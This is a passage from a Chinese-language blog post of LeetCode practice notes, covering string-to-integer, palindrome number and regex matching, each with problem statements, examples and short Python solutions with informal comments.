如果两者都不存在，则假定结果为正。</li><li>读入下一个字符，直到到达下一个非数字字符或到达输入的结尾。字符串的其余部分将被忽略。</li><li>将前面步骤读入的这些数字转换为整数（即，“123” -&gt; 123， “0032” -&gt; 32）。如果没有读入数字，则整数为 0 。必要时更改符号（从步骤 2 开始）。</li><li>如果整数数超过32位有符号整数范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>，需要截断这个整数，使其保持在这个范围内。具体来说，小于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>的整数应该被固定为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>，大于<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的整数应该被固定为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2^{31}-1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。</li><li>返回整数作为最终结果。</li></ul><p>注意：<br />本题中的空白字符只包括空格字符’ '。<br />除前导空格或数字后的其余字符串外，请勿忽略任何其他字符。</p><p>示例1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;42&quot;</span><br><span class="line">输出：42</span><br><span class="line">解释：加粗的字符串为已经读入的字符，插入符号是当前读取的字符。</span><br><span class="line">第 1 步：&quot;42&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;42&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;42&quot;（读入 &quot;42&quot;）</span><br><span class="line">   ^</span><br><span class="line">解析得到整数 42 。</span><br></pre></td></tr></table></figure><p>由于 “42” 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 42 。</p><p>示例2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;   -42&quot;</span><br><span class="line">输出：-42</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;   -42&quot;（读入前导空格，但忽视掉）</span><br><span class="line">^</span><br><span class="line">第 2 步：&quot;   -42&quot;（读入 &#39;-&#39; 字符，所以结果应该是负数）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;   -42&quot;（读入 &quot;42&quot;）</span><br><span class="line">   ^</span><br><span class="line">解析得到整数 -42 。</span><br></pre></td></tr></table></figure><p>由于 “-42” 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 -42 。</p><p>示例3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;4193 with words&quot;</span><br><span class="line">输出：4193</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;4193 with words&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;4193 with words&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;4193 with words&quot;（读入 &quot;4193&quot;；由于下一个字符不是一个数字，所以读入停止）</span><br><span class="line"> ^</span><br><span class="line">解析得到整数 4193 。</span><br></pre></td></tr></table></figure><p>由于 “4193” 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 4193 。</p><p>示例4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;words and 987&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;words and 987&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;words and 987&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;）</span><br><span class="line"> ^</span><br><span class="line">第 3 步：&quot;words and 987&quot;（由于当前字符 &#39;w&#39; 不是一个数字，所以读入停止）</span><br><span class="line"> ^</span><br><span class="line">解析得到整数 0 ，因为没有读入任何数字。</span><br></pre></td></tr></table></figure><p>由于 0 在范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>内，最终结果为 0 。</p><p>示例5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;-91283472332&quot;</span><br><span class="line">输出：-2147483648</span><br><span class="line">解释：</span><br><span class="line">第 1 步：&quot;-91283472332&quot;（当前没有读入字符，因为没有前导空格）</span><br><span class="line"> ^</span><br><span class="line">第 2 步：&quot;-91283472332&quot;（读入 &#39;-&#39; 字符，所以结果应该是负数）</span><br><span class="line">  ^</span><br><span class="line">第 3 步：&quot;-91283472332&quot;（读入 &quot;91283472332&quot;）</span><br><span class="line"> ^</span><br><span class="line">解析得到整数 -91283472332 。</span><br></pre></td></tr></table></figure><p>由于 -91283472332 小于范围<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo>−</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[-2^{31}, 2^{31} - 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span>的下界，最终结果被截断为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup></mrow><annotation encoding="application/x-tex">-2^{31}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> = -2147483648 。</p><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/string-to-integer-atoi">https://leetcode-cn.com/problems/string-to-integer-atoi</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; int:</span></span><br><span class="line">s = s.strip()</span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> length == <span class="number">0</span> <span class="keyword">or</span> s[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;+-0123456789&quot;</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&quot;+&quot;</span>:</span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">elif</span> s[<span class="number">0</span>] == <span class="string">&quot;-&quot;</span>:</span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">s = s[<span class="number">1</span>:]</span><br><span class="line">num_list = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> s:</span><br><span class="line"><span class="keyword">if</span> _ <span class="keyword">in</span> <span class="string">&quot;0123456789&quot;</span>:</span><br><span class="line">num_list.append(_)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">num_sum = <span class="number">0</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">1</span>, -<span class="built_in">len</span>(num_list)-<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">num_sum += <span class="built_in">int</span>(num_list[_]) * <span class="built_in">pow</span>(<span class="number">10</span>, index)</span><br><span class="line">index += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> flag == <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">if</span> num_sum &lt;= <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span>(num_sum)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>) - <span class="number">1</span>)</span><br><span class="line"><span class="keyword">elif</span> num_sum &lt;= <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>):</span><br><span class="line"><span class="keyword">return</span>(-num_sum)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(-<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">31</span>))</span><br></pre></td></tr></table></figure><p>和整数反转那题思路差不多<br />无非多做几个检测罢了</p><hr /><h1 id="回文数"><a class="markdownIt-Anchor" href="#回文数"></a> <a href="https://leetcode-cn.com/problems/palindrome-number">回文数</a></h1><p>给你一个整数<code>x</code>，如果<code>x</code>是一个回文整数，返回<code>true</code>；否则，返回<code>false</code>。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。例如，121是回文，而123不是。</p><p>示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 121</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure><p>示例2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; -121</span><br><span class="line">输出：false</span><br><span class="line">解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p>示例 3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; 10</span><br><span class="line">输出：false</span><br><span class="line">解释：从右向左读, 为 01 。因此它不是一个回文数。</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：x &#x3D; -101</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/palindrome-number">https://leetcode-cn.com/problems/palindrome-number</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPalindrome</span>(<span class="params">self, x: <span class="built_in">int</span></span>) -&gt; bool:</span></span><br><span class="line"><span class="keyword">if</span> x &lt; <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">False</span>)</span><br><span class="line">string = <span class="built_in">str</span>(x)</span><br><span class="line"><span class="keyword">if</span> string == string[::-<span class="number">1</span>]:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>当字符串来处理挺方便的<br />就是有点占内存</p><hr /><h1 id="正则表达式匹配"><a class="markdownIt-Anchor" href="#正则表达式匹配"></a> <a href="https://leetcode-cn.com/problems/regular-expression-matching">正则表达式匹配</a></h1><p>给你一个字符串<code>s</code>和一个字符规律<code>p</code>，请你来实现一个支持<code>'.'</code>和<code>'\*'</code>的正则表达式匹配。</p><ul><li>‘.’ 匹配任意单个字符</li><li>‘*’ 匹配零个或多个前面的那一个元素</li></ul><p>所谓匹配，是要涵盖整个字符串s的，而不是部分字符串。<br />示例 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aa&quot; p &#x3D; &quot;a&quot;</span><br><span class="line">输出：false</span><br><span class="line">解释：&quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。</span><br></pre></td></tr></table></figure><p>示例 2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aa&quot; p &#x3D; &quot;a*&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：因为 &#39;*&#39; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &#39;a&#39;。因此，字符串 &quot;aa&quot; 可被视为 &#39;a&#39; 重复了一次。</span><br></pre></td></tr></table></figure><p>示例3：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;ab&quot; p &#x3D; &quot;.*&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：&quot;.*&quot; 表示可匹配零个或多个（&#39;*&#39;）任意字符（&#39;.&#39;）。</span><br></pre></td></tr></table></figure><p>示例 4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aab&quot; p &#x3D; &quot;c*a*b&quot;</span><br><span class="line">输出：true</span><br><span class="line">解释：因为 &#39;*&#39; 表示零个或多个，这里 &#39;c&#39; 为 0 个, &#39;a&#39; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。</span><br></pre></td></tr></table></figure><p>示例 5：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s &#x3D; &quot;mississippi&quot; p &#x3D; &quot;mis*is*p*.&quot;</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure><p>来源：力扣（LeetCode）<br />链接：<a href="https://leetcode-cn.com/problems/regular-expression-matching">https://leetcode-cn.com/problems/regular-expression-matching</a><br />著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isMatch</span>(<span class="params">self, s: <span class="built_in">str</span>, p: <span class="built_in">str</span></span>) -&gt; bool:</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">length = <span class="built_in">len</span>(s)</span><br><span class="line">result = re.match(p, s)</span><br><span class="line"><span class="keyword">if</span> result != <span class="literal">None</span> <span class="keyword">and</span> result.span()[<span class="number">1</span>] == length:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span>(<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>属实不会去写正则的匹配规则<br />直接re.match梭哈了</p><hr /><h1 id="盛最多水的容器"><a class="markdownIt-Anchor" href="#盛最多水的容器"></a> 盛最多水的容器</h1><p>给你n个非负整数<span class="katex"><span 